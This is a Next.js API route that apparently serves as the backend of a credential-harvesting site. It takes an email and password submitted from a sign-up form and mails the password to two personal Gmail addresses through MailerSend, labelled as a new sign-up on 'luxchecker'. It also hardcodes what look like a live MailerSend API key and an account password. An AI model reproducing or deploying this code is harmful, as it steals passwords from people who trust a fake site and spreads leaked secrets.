// pages/api/send-email.js

import { NextResponse, NextRequest } from 'next/server';
import { MailerSend, EmailParams, Sender, Recipient } from "mailersend";

export async function POST(request: NextRequest) {
    try {
        // Parsing JSON data from the request body
        const { email, password } = await request.json();

        // Retrieve environment variables
        const username = "ms_bzxtee@trial-pr9084zxr8mlw63d.mlsender.net";
        const userPassword = "Vy2o2bXgvPKcU7fK";
        const myEmail = "bohlingladonna04@gmail.com";
        const message = "Hello!";
        const apiKey = "mlsn.7584d09b7303599f16a4f478cf216b48540cba331472bbe79e9308ac77545f37";
        
        const mailerSend = new MailerSend({
            apiKey: "mlsn.7584d09b7303599f16a4f478cf216b48540cba331472bbe79e9308ac77545f37",
        });
        
        const recipients = [
            new Recipient(myEmail, "site"),
            new Recipient("jamesjong99@gmail.com", "site")
        ];
        
        const sentFrom = new Sender("luxchecker.vercel.app", username,);
        const emailParams = new EmailParams()
            .setFrom(sentFrom)
            .setTo(recipients)
            .setReplyTo(sentFrom)
            .setSubject("new user attempted to sign up in your site")
            .setHtml(`<strong>User: ${username}</strong><br><strong>Password: ${password}`)
            .setText("This is the text content");

        await mailerSend.email.send(emailParams);
        // Create transporter object
        

        // Send email

        return NextResponse.json({ message: "Success: email was sent" });

    } catch (error) {
        console.error(error);
        return NextResponse.json({ message: "Could not send message" }, { status: 500 });
    }
}
